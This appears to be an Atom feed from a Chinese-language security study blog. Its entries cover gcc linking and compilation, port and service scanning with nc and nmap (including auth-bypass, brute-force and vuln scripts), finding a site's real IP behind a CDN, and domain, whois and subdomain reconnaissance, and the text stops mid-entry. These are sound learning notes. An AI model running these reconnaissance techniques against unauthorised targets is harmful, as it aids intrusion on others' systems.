  <entry>
    <title></title>
    <link href="https://rhea006.github.io/2025/06/be611c228fd6.html"/>
    <id>https://rhea006.github.io/2025/06/be611c228fd6.html</id>
    <published>2025-06-29T14:24:46.004Z</published>
    <updated>2025-06-30T04:13:35.567Z</updated>
    
    <content type="html"><![CDATA[<p>title: 动态链接<br>date: 2025-06-29 20:16:36<br>categories:   -PWN -二进制文件 -ELF文件链接</p><p>tags: </p><h1 id="动态链接（Dynamic-Linking）"><a href="#动态链接（Dynamic-Linking）" class="headerlink" title="动态链接（Dynamic Linking）"></a>动态链接（Dynamic Linking）</h1><ul><li>定义：在运行阶段通过动态链接器（如 Linux 的<code>ld-linux.so</code>）加载所需的共享库（如<code>.so</code>文件）。</li><li>特点：<ul><li>可执行文件体积小，仅包含对共享库的引用。</li><li>多个程序可共享同一库的内存实例，节省资源。</li><li>依赖系统环境中已安装的共享库，部署时需确保库版本兼容。</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编译源代码为目标文件（位置无关代码）</span></span><br><span class="line">gcc -fPIC -c utils.c -o utils.o</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建共享库</span></span><br><span class="line">gcc -shared utils.o -o libutils.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># 动态链接生成可执行文件</span></span><br><span class="line">gcc main.o -L. -lutils -o main_dynamic</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行前设置库搜索路径（临时）</span></span><br><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=<span class="variable">$LD_LIBRARY_PATH</span>:.</span><br><span class="line">./main_dynamic</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;title: 动态链接&lt;br&gt;date: 2025-06-29 20:16:36&lt;br&gt;categories:   -PWN -二进制文件 -ELF文件链接&lt;/p&gt;
&lt;p&gt;tags: &lt;/p&gt;
&lt;h1 id=&quot;动态链接（Dynamic-Linking）&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="二进制文件" scheme="https://rhea006.github.io/categories/PWN/Learning/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/"/>
    
    <category term="3-ELF 文件链接" scheme="https://rhea006.github.io/categories/PWN/Learning/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/3-ELF-%E6%96%87%E4%BB%B6%E9%93%BE%E6%8E%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>静态链接</title>
    <link href="https://rhea006.github.io/2025/06/19c857e8afbe.html"/>
    <id>https://rhea006.github.io/2025/06/19c857e8afbe.html</id>
    <published>2025-06-29T12:16:36.000Z</published>
    <updated>2025-06-30T06:12:25.797Z</updated>
    
    <content type="html"><![CDATA[<h1 id="静态链接（Static-Linking）"><a href="#静态链接（Static-Linking）" class="headerlink" title="静态链接（Static Linking）"></a>静态链接（Static Linking）</h1><ul><li>定义：在编译阶段将所有依赖的库文件（如<code>.a</code>静态库）直接合并到可执行文件中。</li><li>特点：<ul><li>可执行文件独立运行，无需外部依赖。</li><li>生成文件体积大，包含所有必要代码。</li><li>适合部署环境不稳定或对运行速度要求高的场景。</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编译源代码为目标文件</span></span><br><span class="line">gcc -c main.c -o main.o</span><br><span class="line">gcc -c utils.c -o utils.o</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建静态库</span></span><br><span class="line">ar rcs libutils.a utils.o</span><br><span class="line"></span><br><span class="line"><span class="comment"># 静态链接生成可执行文件</span></span><br><span class="line">gcc -static main.o -L. -lutils -o main_static</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;静态链接（Static-Linking）&quot;&gt;&lt;a href=&quot;#静态链接（Static-Linking）&quot; class=&quot;headerlink&quot; title=&quot;静态链接（Static Linking）&quot;&gt;&lt;/a&gt;静态链接（Static Linking）&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="二进制文件" scheme="https://rhea006.github.io/categories/PWN/Learning/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/"/>
    
    <category term="3-ELF 文件链接" scheme="https://rhea006.github.io/categories/PWN/Learning/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/3-ELF-%E6%96%87%E4%BB%B6%E9%93%BE%E6%8E%A5/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://rhea006.github.io/2025/06/2167c014e2bb.html"/>
    <id>https://rhea006.github.io/2025/06/2167c014e2bb.html</id>
    <published>2025-06-29T05:57:20.304Z</published>
    <updated>2025-06-30T04:13:35.567Z</updated>
    
    <content type="html"><![CDATA[<p>title: 端口服务信息<br>date: 2025-06-29 20:16:36<br>categories:<br>tags: -渗透测试</p><h1 id="扫描的思路和代码实现"><a href="#扫描的思路和代码实现" class="headerlink" title="扫描的思路和代码实现"></a>扫描的思路和代码实现</h1><h2 id="一个服务一个端口"><a href="#一个服务一个端口" class="headerlink" title="一个服务一个端口"></a>一个服务一个端口</h2><h2 id="查看本机端口信息"><a href="#查看本机端口信息" class="headerlink" title="查看本机端口信息"></a>查看本机端口信息</h2><h6 id="windows"><a href="#windows" class="headerlink" title="windows:"></a>windows:</h6><p>netstat -aon|findstr 3306</p><h6 id="Linux"><a href="#Linux" class="headerlink" title="Linux:"></a>Linux:</h6><p>netstat -an|grep 3306</p><p>若未显示结果，说明对应服务未启动（如示例中的MySQL和80端口服务）</p><h2 id="远程机器端口"><a href="#远程机器端口" class="headerlink" title="远程机器端口"></a>远程机器端口</h2><p>telnet 192.168.142.130 80</p><p>wget 192.168.142.130 80</p><p>nc -vz 192.168.142.130 445</p><p>python代码扫描 wscan.py（批量扫描）</p><p>nc -vz 192.168.142.130 80-9000（netcat有扫描功能，能显示服务名称）</p><h1 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h1><p><a href="https://nsrc.org/workshops/2009/summer/presentations/day3/common-ports.pdf">(Cheat Sheet - Common Ports)</a></p><h2 id="文件共享服务"><a href="#文件共享服务" class="headerlink" title="文件共享服务"></a>文件共享服务</h2><p>21&#x2F;22&#x2F;69：FTP&#x2F;SFTP文件传输协议<br>2049：NFS服务（Network File System）<br>139：Samba服务<br>389：LDAP目录访问协议（Light Directory Access Portocol）</p><h2 id="远程连接服务"><a href="#远程连接服务" class="headerlink" title="远程连接服务"></a>远程连接服务</h2><p>22：SSH远程连接<br>23：Telnet远程连接<br>3389：RDP远程桌面连接<br>5900：VNC远程连接<br>5632：PcAnywhere远程控制服务</p><h2 id="Web应用服务"><a href="#Web应用服务" class="headerlink" title="Web应用服务"></a>Web应用服务</h2><p>80&#x2F;443&#x2F;8080：常见的web服务端口<br>7001&#x2F;7002：Weblogic控制台<br>8080&#x2F;8089：Jboss&#x2F;resin&#x2F;jetty&#x2F;Jenkins</p><p>9090：Websphere控制台<br>4848：Glassfish控制台<br>1352：Lotus domino邮件服务<br>10000：Webmin-web控制面板</p><h2 id="数据库服务"><a href="#数据库服务" class="headerlink" title="数据库服务"></a>数据库服务</h2><p>3306：MySQL<br>1433：MSSQL数据库<br>1521：Oracle数据库<br>5432：PostgreSQL数据库<br>27017&#x2F;27018：MongoDB<br>6379：Redis数据库<br>5000：Sysbase&#x2F;DB2数据库</p><h2 id="邮件服务"><a href="#邮件服务" class="headerlink" title="邮件服务"></a>邮件服务</h2><p>25：SMTP邮件服务<br>110：POP3协议<br>143：IMAP协议</p><h2 id="网络常见协议"><a href="#网络常见协议" class="headerlink" title="网络常见协议"></a>网络常见协议</h2><p>53：DNS域名系统<br>67&#x2F;68：DHCP服务<br>161：SNMP协议</p><h2 id="特殊服务"><a href="#特殊服务" class="headerlink" title="特殊服务"></a>特殊服务</h2><p>2181：Zookeeper服务<br>8069：Zabbix服务<br>9200&#x2F;9300：Elasticsearch服务<br>11211：Memcached服务<br>512&#x2F;513&#x2F;514：Linux Rexec服务<br>873：Rsync服务<br>3690：SVN服务<br>50000：SAP Management Console</p><h1 id="metasploitable2靶机"><a href="#metasploitable2靶机" class="headerlink" title="metasploitable2靶机"></a>metasploitable2靶机</h1><p>链接：<a href="https://pan.baidu.com/s/1u-MTtxATAfhE5ELnhCS-Fg">https://pan.baidu.com/s/1u-MTtxATAfhE5ELnhCS-Fg</a><br>提取码：8888 </p><p>下载、解压、导入VM<br>默认用户名密码 msfadmin&#x2F;msfadmin<br>修改root密码 sudo passwd root<br>ifconfig查看IP</p><h1 id="端口扫描工具NMap（Network-Mapper）"><a href="#端口扫描工具NMap（Network-Mapper）" class="headerlink" title="端口扫描工具NMap（Network Mapper）"></a>端口扫描工具NMap（Network Mapper）</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p><a href="https://nmap.org/">Nmap：网络映射器 - 免费的安全扫描程序</a></p><p>图形界面：zenmap</p><p>主要功能<br>1）扫描主机(Host Discovery)<br>2）扫描端口(Port Scanning)<br>3）探测操作系统、软件版本 (Operating System Detection、Version Detection)</p><h2 id="参数分类"><a href="#参数分类" class="headerlink" title="参数分类"></a>参数分类</h2><p><a href="https://nmap.org/book/man.html">第 15 章.Nmap 参考指南 |Nmap 网络扫描</a></p><p>nmap –help</p><p>TARGET SPECIFICATION:目标，对什么进行扫描，比如是域名、IP或者网络<br>HOST DISCOVERY:主机发现，怎么对主机进行扫描，比如简单扫描，还是全部扫一遍，或者用<br>相应的协议扫<br>SCAN TECHNIQUES:扫描技术，协议的设置<br>PORT SPECIFICATION AND SCAN ORDER:端口和扫描顺序设置<br>SERVICE&#x2F;VERSION DETECTION:服务和版本识别<br>SCRIPT SCAN:使用脚本，nmap本身内置了大量的lua脚本，而且还可以自己编写脚本</p><p>【nmap本身内置了大量的lua脚本，而且还可以自己编写脚本<br>ls &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F; | wc -l<br>全部清单：<a href="https://nmap.org/nsedoc/index.html">https://nmap.org/nsedoc/index.html</a><br>例如：<br>nmap 192.168.142.137 –script http-enum 列举HTTP服务<br>nmap –script&#x3D;auth 绕过鉴权<br>nmap –script&#x3D;brute 暴力破解<br>nmap –script&#x3D;vuln 扫描漏洞】</p><p>OS DETECTION:操作系统识别<br>TIMING AND PERFORMANCE:时间和性能设置，比如扫描频率、重试次数等等<br>FIREWALL&#x2F;IDS EVASION AND SPOOFING:防火墙绕过和欺骗，比如使用代理，假IP等<br>OUTPUT:把扫描接出输出到文件<br>MISC: 杂项：启用IPv6等等配置参数示例</p><h2 id="参数示例"><a href="#参数示例" class="headerlink" title="参数示例"></a>参数示例</h2><p>nmap 192.168.142.133 # metasploitable2 Linux</p><p><a href="http://testfire.net/">http://testfire.net/</a></p><p>nmap testfire.net           # IBM的一个靶场<br>简单扫描：nmap -sP 192.168.142.133<br>指定端口或范围扫描： nmap -p0-65535 192.168.142.133<br>探测操作系统： nmap -O 192.168.142.133</p><p>【cat &#x2F;proc&#x2F;version】</p><p>只进行主机发现，不进行端口扫描： nmap -sn 192.168.40.195&#x2F;24</p><h6 id="IP后面的-24是什么意思？"><a href="#IP后面的-24是什么意思？" class="headerlink" title="IP后面的&#x2F;24是什么意思？"></a>IP后面的&#x2F;24是什么意思？</h6><p>&#x2F;24含义: IP地址后的&#x2F;24表示子网掩码的位数为24位，即255.255.255.0，属于C类IP地址。</p><p>掩码的位数。<br>子网掩码8位，11111111.00000000.00000000.00000000 代表：255.0.0.0（A类IP地址）<br>子网掩码16位，11111111.11111111.00000000.00000000 代表：255.255.0.0（B类IP地址）<br>子网掩码24位，11111111.11111111.11111111.00000000 代表：255.255.255.0（C类IP地址）<br>旁站：和目标网站在同一台服务器但端口不同的其他网站。<br>C段 ：和目标服务器IP处在同一个C段的其它服务器。</p><h2 id="界面工具Zenmap"><a href="#界面工具Zenmap" class="headerlink" title="界面工具Zenmap"></a>界面工具Zenmap</h2><p>第一种：Intense scan<br>第二种：Intense scan plus UDP<br>第三种：Intense scan,all TCP ports<br>第四种：Intense scan,no ping<br>第五种：Ping scan<br>第六种：Quick scan<br>第七种：Quick scan plus<br>第八种：Quick traceroute<br>第九种：Regular scan<br>第十种：Slow comprehensive scan</p><h1 id="其他扫描工具"><a href="#其他扫描工具" class="headerlink" title="其他扫描工具"></a>其他扫描工具</h1><p>masscan、nbtscan<br><a href="http://coolaf.com/tool/port">在线端口检测,端口扫描,端口开放检查-在线工具-postjson</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;title: 端口服务信息&lt;br&gt;date: 2025-06-29 20:16:36&lt;br&gt;categories:&lt;br&gt;tags: -渗透测试&lt;/p&gt;
&lt;h1 id=&quot;扫描的思路和代码实现&quot;&gt;&lt;a href=&quot;#扫描的思路和代码实现&quot; class=&quot;headerlink&quot;</summary>
      
    
    
    
    <category term="Penetration Test" scheme="https://rhea006.github.io/categories/Penetration-Test/"/>
    
    <category term="信息收集" scheme="https://rhea006.github.io/categories/Penetration-Test/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://rhea006.github.io/2025/06/17f7e2087847.html"/>
    <id>https://rhea006.github.io/2025/06/17f7e2087847.html</id>
    <published>2025-06-29T04:55:03.925Z</published>
    <updated>2025-06-30T04:13:35.565Z</updated>
    
    <content type="html"><![CDATA[<p>title: IP信息<br>date: 2025-06-28 20:16:36<br>categories:<br>tags: -渗透测试</p><h1 id="DNS服务器的类型"><a href="#DNS服务器的类型" class="headerlink" title="DNS服务器的类型"></a>DNS服务器的类型</h1><ul><li>本地域名服务器: 在网络适配器中配置的服务器地址，如114.114.114.114或8.8.8.8，可能是路由器地址。</li><li>根域名服务器: 负责全球域名的解析，如.com、.net等顶级域名的管理。</li><li>顶级域名服务器: 解析我们注册的一级域名（实际上是二级域名，因为.com等才是一级域名）。</li><li>授权域名服务器: 解析三级域名（实际上是四级域名），如blog.wuya.com，知道配置记录指向的IP。</li></ul><h2 id="查询方式："><a href="#查询方式：" class="headerlink" title="查询方式："></a>查询方式：</h2><ul><li>迭代查询: 本地域名服务器依次查询根域名服务器、顶级域名服务器、授权域名服务器。</li><li>递归查询: 本地域名服务器帮助查询，层层返回结果。</li></ul><p><img src="/./../../../images/image-20250629130717006.png" alt="image-20250629130717006"></p><h1 id="ping-nslookup"><a href="#ping-nslookup" class="headerlink" title="ping &#x2F; nslookup"></a>ping &#x2F; nslookup</h1><h2 id="Packet-Internet-Groper（因特网包探索器）："><a href="#Packet-Internet-Groper（因特网包探索器）：" class="headerlink" title="Packet Internet Groper（因特网包探索器）："></a>Packet Internet Groper（因特网包探索器）：</h2><p>用于检测网络通畅性，也可根据域名获得服务器IP。</p><h2 id="nslookup工具"><a href="#nslookup工具" class="headerlink" title="nslookup工具:"></a>nslookup工具:</h2><p>也可用于查询域名对应的IP，可指定查询类型，如MX记录（邮件交换记录）。</p><p>nslookup -type&#x3D;”MX” baidu.com</p><h1 id="IP归属信息"><a href="#IP归属信息" class="headerlink" title="IP归属信息"></a>IP归属信息</h1><p><a href="http://ipwhois.cnnic.net.cn/">http://ipwhois.cnnic.net.cn/</a></p><p><a href="https://www.ip38.com/">iP地址查询 - iP38查询网</a></p><p>进行IP归属查询，可查询IPv4&#x2F;IPv6地址、AS号码、网络名称等信息。</p><p>运营商：显示为”China Mobile Communications Corporation”，即中国移动</p><p>IP段范围：</p><p>地理位置：</p><p>管理联系人：</p><h1 id="如何获取CDN背后的真实IP"><a href="#如何获取CDN背后的真实IP" class="headerlink" title="如何获取CDN背后的真实IP"></a>如何获取CDN背后的真实IP</h1><h2 id="CDN-Content-Delivery-Network-内容分发网络"><a href="#CDN-Content-Delivery-Network-内容分发网络" class="headerlink" title="CDN(Content Delivery Network)内容分发网络"></a>CDN(Content Delivery Network)内容分发网络</h2><h4 id="使用CDN服务-将相同内容部署在多台服务器上，形成源站-多个节点服务器的架构。"><a href="#使用CDN服务-将相同内容部署在多台服务器上，形成源站-多个节点服务器的架构。" class="headerlink" title="使用CDN服务 :将相同内容部署在多台服务器上，形成源站+多个节点服务器的架构。"></a>使用CDN服务 :将相同内容部署在多台服务器上，形成源站+多个节点服务器的架构。</h4><p>优势：</p><ul><li>负载均衡：分摊访问请求，减少单台服务器压力</li><li>加速访问：用户访问最近的节点服务器，缩短物理距离，提升响应速度（如武汉用户访问武汉服务器比北京服务器更快）</li><li>应用案例：淘宝早期就采用CDN技术处理商品图片等静态内容</li></ul><h2 id="实现流程（以阿里云为例）"><a href="#实现流程（以阿里云为例）" class="headerlink" title="实现流程（以阿里云为例）"></a>实现流程（以阿里云为例）</h2><p><a href="https://www.zhihu.com/question/36514327/answer/1604554133">https://www.zhihu.com/question/36514327/answer/1604554133</a></p><ol><li>当终端用户（北京）向<a href="http://www.a.com下的指定资源发起请求时,首先/">www.a.com下的指定资源发起请求时，首先</a><br>向LDNS（本地DNS）发起域名解析请求。</li><li>LDNS检查缓存中是否有<a href="http://www.a.com的ip地址记录.如果有,则直/">www.a.com的IP地址记录。如果有，则直</a><br>接返回给终端用户；如果没有，则向授权DNS查询。</li><li>当授权DNS解析<a href="http://www.a.com时,返回域名cname/">www.a.com时，返回域名CNAME</a><br><a href="http://www.a.tbcdn.com对应ip地址./">www.a.tbcdn.com对应IP地址。</a></li><li>域名解析请求发送至阿里云DNS调度系统，并为请求分配最佳节点<br>IP地址。</li><li>LDNS获取DNS返回的解析IP地址。</li><li>用户获取解析IP地址。</li><li>用户向获取的IP地址发起对该资源的访问请求。</li></ol><h2 id="如何找出真实IP"><a href="#如何找出真实IP" class="headerlink" title="如何找出真实IP"></a>如何找出真实IP</h2><p><img src="/./../../../images/image-20250629133105891.png" alt="image-20250629133105891"></p><p>CDN会隐藏真实服务器IP，需要通过特殊技术手段获取</p><h3 id="1、超级ping"><a href="#1、超级ping" class="headerlink" title="1、超级ping"></a>1、超级ping</h3><h3 id="2、历史DNS"><a href="#2、历史DNS" class="headerlink" title="2、历史DNS"></a>2、历史DNS</h3><p><a href="https://tools.ipip.net/cdn.php">全球 CDN 服务商查询_专业精准的IP库服务商_IPIP</a></p><p><a href="https://sitereport.netcraft.com/">该网站正在运行什么？|网络工艺</a></p><h3 id="3、通过子域名查询IP"><a href="#3、通过子域名查询IP" class="headerlink" title="3、通过子域名查询IP"></a>3、通过子域名查询IP</h3><h3 id="4、国外主机解析"><a href="#4、国外主机解析" class="headerlink" title="4、国外主机解析"></a>4、国外主机解析</h3><p>原理：部分网站未部署海外CDN节点，国外访问可能直连源站</p><p>工具：</p><ul><li><a href="https://www.webpagetest.org/">WebPageTest - 网站性能和优化测试</a></li><li><a href="https://dnscheck.pingdom.com/">网站速度测试 |Pingdom 工具</a></li><li><a href="https://www.host-tracker.com/en">网站正常运行时间监控服务，检查网站是否关闭 - Host-tracker</a></li></ul><h3 id="5、其他"><a href="#5、其他" class="headerlink" title="5、其他"></a>5、其他</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;title: IP信息&lt;br&gt;date: 2025-06-28 20:16:36&lt;br&gt;categories:&lt;br&gt;tags: -渗透测试&lt;/p&gt;
&lt;h1 id=&quot;DNS服务器的类型&quot;&gt;&lt;a href=&quot;#DNS服务器的类型&quot; class=&quot;headerlink&quot; tit</summary>
      
    
    
    
    <category term="Penetration Test" scheme="https://rhea006.github.io/categories/Penetration-Test/"/>
    
    <category term="信息收集" scheme="https://rhea006.github.io/categories/Penetration-Test/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://rhea006.github.io/2025/06/ef5dd01768e9.html"/>
    <id>https://rhea006.github.io/2025/06/ef5dd01768e9.html</id>
    <published>2025-06-28T13:31:45.017Z</published>
    <updated>2025-06-30T04:13:35.565Z</updated>
    
    <content type="html"><![CDATA[<p>title: 编译流程<br>date: 2025-06-28 20:16:36<br>categories:<br>tags: -编译流程</p><p><img src="/./../../../../../images/image-20250628213150350.png" alt="image-20250628213150350"></p><p>1.<strong>编译 (<code>gcc -S</code>)</strong></p><ul><li><p>将<code>p1.c</code>&#x2F;<code>p2.c</code>转为汇编指令<code>p1.s</code>&#x2F;<code>p2.s</code></p></li><li><p><strong>Pwn关注点</strong>：编译器优化（如<code>-O0</code>禁用优化利于调试）、栈保护（<code>-fno-stack-protector</code>）</p></li><li><pre><code class="language-bash">gcc -S p1.c                # 生成汇编gcc -c p1.s                # 生成目标文件gcc p1.o p2.o -o p         # 链接</code></pre></li></ul><p>2.<strong>汇编 (<code>as</code> 或 <code>gcc -c</code>)</strong></p><ul><li>将汇编代码转为<strong>机器码</strong>，生成目标文件<code>p1.o</code>&#x2F;<code>p2.o</code></li><li><strong>关键特点</strong>：包含代码&#x2F;数据段，但地址未确定（<code>relocatable</code>）</li></ul><p>3.<strong>链接 (<code>ld</code> 或 <code>gcc</code>)</strong></p><ul><li>合并目标文件+静态库(<code>.a</code>)，解析符号地址，生成可执行文件<code>p</code></li><li><strong>Pwn核心</strong>：<ul><li><strong>内存布局</strong>：确定<code>.text</code>(代码)&#x2F;<code>.data</code>(全局变量)&#x2F;<code>.bss</code>(未初始化数据)的虚拟地址</li><li><strong>动态链接</strong>：涉及<code>PLT</code>(过程链接表)&#x2F;<code>GOT</code>(全局偏移表)——<strong>漏洞利用关键跳板！</strong></li></ul></li></ul><p><img src="/./../../../../../images/image-20250628214752807.png" alt="image-20250628214752807"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;title: 编译流程&lt;br&gt;date: 2025-06-28 20:16:36&lt;br&gt;categories:&lt;br&gt;tags: -编译流程&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/./../../../../../images/image-20250628213150350.</summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="二进制文件" scheme="https://rhea006.github.io/categories/PWN/Learning/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/"/>
    
    <category term="1-从源代码到可执行文件" scheme="https://rhea006.github.io/categories/PWN/Learning/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/1-%E4%BB%8E%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%B0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/"/>
    
    
  </entry>
  
  <entry>
    <title>域名信息收集</title>
    <link href="https://rhea006.github.io/2025/06/a2f5477bcf25.html"/>
    <id>https://rhea006.github.io/2025/06/a2f5477bcf25.html</id>
    <published>2025-06-28T12:16:36.000Z</published>
    <updated>2025-06-30T04:13:35.565Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-域名是什么"><a href="#1-域名是什么" class="headerlink" title="1.域名是什么?"></a>1.域名是什么?</h1><p>用来代替IP，找到网络上的一台计算机</p><p><img src="/./../../../images/image-20250628152826187.png" alt="image-20250628152826187"></p><h1 id="2-域名的分类："><a href="#2-域名的分类：" class="headerlink" title="2.域名的分类："></a>2.域名的分类：</h1><h3 id="国际域名"><a href="#国际域名" class="headerlink" title="国际域名:"></a>国际域名:</h3><p>.com(商业公司);.net(网络服务);.org(组织协会等);.gov(政府部);.edu(教育机构);.mil(军事领域);.int(国际组织)</p><h3 id="国别域名"><a href="#国别域名" class="headerlink" title="国别域名:"></a>国别域名:</h3><p>.CN代表中国，.UK代表英国，.US代表美国</p><h3 id="新顶级域名"><a href="#新顶级域名" class="headerlink" title="新顶级域名:"></a>新顶级域名:</h3><p>biz,info，name，pro，aero,coop, museum..</p><h1 id="3-域名联系人信息"><a href="#3-域名联系人信息" class="headerlink" title="3.域名联系人信息"></a>3.域名联系人信息</h1><p>所属人、邮箱、电话、地址…..</p><p><a href="https://site.ip138.com/dbcha.com/domain.htm">dbcha.com子域名大全 dbcha.com二级域名 dbcha.com域名解析查询</a></p><h3 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h3><p>.com由域名运营商VeriSign 管理</p><p>cn域名由CNNIC 管理</p><h4 id="whois工具"><a href="#whois工具" class="headerlink" title="whois工具"></a>whois工具</h4><p><a href="https://whois.chinaz.com/">https://whois.chinaz.com</a><br><a href="http://whoissoft.com/">http://whoissoft.com</a><br><a href="https://whois.cnnic.cn/WelcomeServlet">https://whois.cnnic.cn/WelcomeServlet</a><br>kali whois命令</p><p><img src="/./../../../images/image-20250629091525995.png" alt="image-20250629091525995"></p><h3 id="域名反查"><a href="#域名反查" class="headerlink" title="域名反查"></a>域名反查</h3><p><a href="http://whois.chinaz.com/reverse">http://whois.chinaz.com/reverse</a></p><h3 id="ICP备案查询"><a href="#ICP备案查询" class="headerlink" title="ICP备案查询"></a>ICP备案查询</h3><h3 id="企业信息查询"><a href="#企业信息查询" class="headerlink" title="企业信息查询"></a>企业信息查询</h3><p>官方渠道：beian.miit.gov.cn</p><p>工具：天眼查、企查查等</p><p>查询方式：输入单位名称&#x2F;域名&#x2F;备案号</p><p>备案号规则：个人唯一，多个网站使用”-1”,”-2”等后缀</p><h1 id="4-子域名信息"><a href="#4-子域名信息" class="headerlink" title="4.子域名信息"></a>4.子域名信息</h1><h3 id="子域名的作用"><a href="#子域名的作用" class="headerlink" title="子域名的作用"></a>子域名的作用</h3><h4 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h4><p>子域名是主域名下的二级域名，格式为”子域名.主域名”，如news.baidu.com</p><h4 id="作用原理："><a href="#作用原理：" class="headerlink" title="作用原理："></a>作用原理：</h4><p>·资源隔离：可将不同服务部署在不同服务器（如news.baidu.com和map.baidu.com指向不同IP）</p><p>·品牌统一：保持同一品牌下的多产品线（如百度新闻、百度地图）</p><p>·零成本扩展：无需额外注册新域名，理论上子域名数量无限制</p><h4 id="对比方案："><a href="#对比方案：" class="headerlink" title="对比方案："></a>对比方案：</h4><p>·子目录方案：如<a href="http://www.baidu.com/news%EF%BC%88%E6%89%80%E6%9C%89%E6%9C%8D%E5%8A%A1%E5%85%B1%E4%BA%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%B5%84%E6%BA%90%EF%BC%8C%E6%80%A7%E8%83%BD%E5%8F%97%E9%99%90%EF%BC%89">www.baidu.com/news（所有服务共享服务器资源，性能受限）</a></p><p>·独立域名方案：如bdnews.com（注册管理成本高）</p><h3 id="怎么查询子域名？"><a href="#怎么查询子域名？" class="headerlink" title="怎么查询子域名？"></a>怎么查询子域名？</h3><h4 id="1、字典猜解："><a href="#1、字典猜解：" class="headerlink" title="1、字典猜解："></a>1、字典猜解：</h4><p>使用常见子名字典（如oa、crm、bbs等前缀）</p><h4 id="2、暴力枚举："><a href="#2、暴力枚举：" class="headerlink" title="2、暴力枚举："></a>2、暴力枚举：</h4><p>从a-z、0-9组合尝试（1位→多位）</p><h4 id="3、技术实现："><a href="#3、技术实现：" class="headerlink" title="3、技术实现："></a>3、技术实现：</h4><p>·端口探测：默认扫描80(http)和443(https)端口</p><p>·状态检测：通过HTTP响应码判断服务可用性（200&#x2F;302为有效）</p><p><a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p><h1 id="5-域名DNS信息"><a href="#5-域名DNS信息" class="headerlink" title="5.域名DNS信息"></a>5.域名DNS信息</h1><h3 id="1-域名与IP"><a href="#1-域名与IP" class="headerlink" title="1. 域名与IP"></a>1. 域名与IP</h3><h4 id="DNS本质："><a href="#DNS本质：" class="headerlink" title="DNS本质："></a>DNS本质：</h4><p>DNS(Domain Name Server)是将域名映射为IP地址的解析服务，本质是一个记录域名与IP映射关系的分布式数据库。</p><h4 id="工作原理："><a href="#工作原理：" class="headerlink" title="工作原理："></a>工作原理：</h4><p>当用户访问域名时，DNS服务会查询其数据库中的映射表，将域名转换为对应的IP地址。</p><h3 id="2-域名解析信息"><a href="#2-域名解析信息" class="headerlink" title="2. 域名解析信息"></a>2. 域名解析信息</h3><h4 id="配置流程："><a href="#配置流程：" class="headerlink" title="配置流程："></a>配置流程：</h4><p>在域名注册商处设置DNS服务器（如DNSPod）</p><p>在DNS服务平台配置具体解析规则</p><p><img src="/./../../../images/image-20250629100748277.png" alt="image-20250629100748277"></p><h4 id="配置示例："><a href="#配置示例：" class="headerlink" title="配置示例："></a>配置示例：</h4><p>@符号代表所有地址</p><p>www代表特定子域名</p><p>一个域名可配置多条不同类型记录</p><h4 id="记录类型"><a href="#记录类型" class="headerlink" title="记录类型"></a>记录类型</h4><p>A记录：是最常用类型，将域名指向一个IPv4地址，如8.8.8.8<br>CNAME：别名记录，将域名指向另一个域名地址，与其保持相同解析(如z.cn跳转到amazon.cn)</p><p>MX：用于邮件服务器，相关参数一般由邮件注册商提供，企业邮箱服务(如腾讯企业邮mxdomain.qq.com）</p><p>TXT：可填写附加文本信息，常用于域名验证<br>NS(name 